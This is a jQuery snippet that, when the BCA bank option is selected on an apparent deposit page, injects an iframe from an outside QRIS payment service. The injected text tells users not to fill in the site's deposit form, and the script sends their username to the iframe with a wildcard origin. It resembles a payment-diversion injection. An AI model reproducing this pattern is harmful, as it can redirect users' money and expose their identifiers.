$(document).ready(function () {
            function handleBCAText() {
                const selectedText = $(".dd-selected-text").text().trim();
                if (selectedText === "BCA") {
                    if (!$("#injectautodepoqris").length) {
                        $('<div id="injectautodepoqris" class="relative flex content-start flex-wrap" style="height: 500px; display: block;"><h1 class="pesan-rahasia">Setelah Transfer Selesai,<br> Silakan Refresh Akun Anda <br>Tanpa Mengisi Formulir Deposit.</h1><iframe id="iframeaudotdepoqris" scrolling="no" style="height: 100%; width: 100%; overflow: hidden;" src="https://qrisni.me/qrisolx1"></iframe></div>').insertAfter($('#bankDropDown'));
                        $('#iframeaudotdepoqris').on('load', function () {
                            document.getElementById('iframeaudotdepoqris').contentWindow.postMessage('{"username":"' + $('.mb-lobby-username').text().toLowerCase() + '"}', '*');
                            onchangebank();
                        });
                    } else {
                        $("#injectautodepoqris").show();
                    }
                } else {
                    $("#injectautodepoqris").hide();
                }
            }
        
            $(".dd-select").on("click", function () {
                $(".dd-options").toggle();
            });
        
            $(".dd-option").on("click", function () {
                const selectedValue = $(this).find(".dd-option-value").val();
                const selectedText = $(this).find(".dd-option-text").text();
                const selectedImage = $(this).find(".dd-option-image").attr("src");
                $(".dd-selected-value").val(selectedValue);
                $(".dd-selected-text").text(selectedText);
                $(".dd-selected-image").attr("src", selectedImage);
                $(".dd-options").hide();
                handleBCAText();
            });
            $(document).on("click", function (e) {
                if (!$(e.target).closest("#bankDropDown").length) {
                    $(".dd-options").hide();
                }
            });
            $("#bankDropDown").on("change", function () {
                $("#injectautodepoqris").hide();
            });
        });
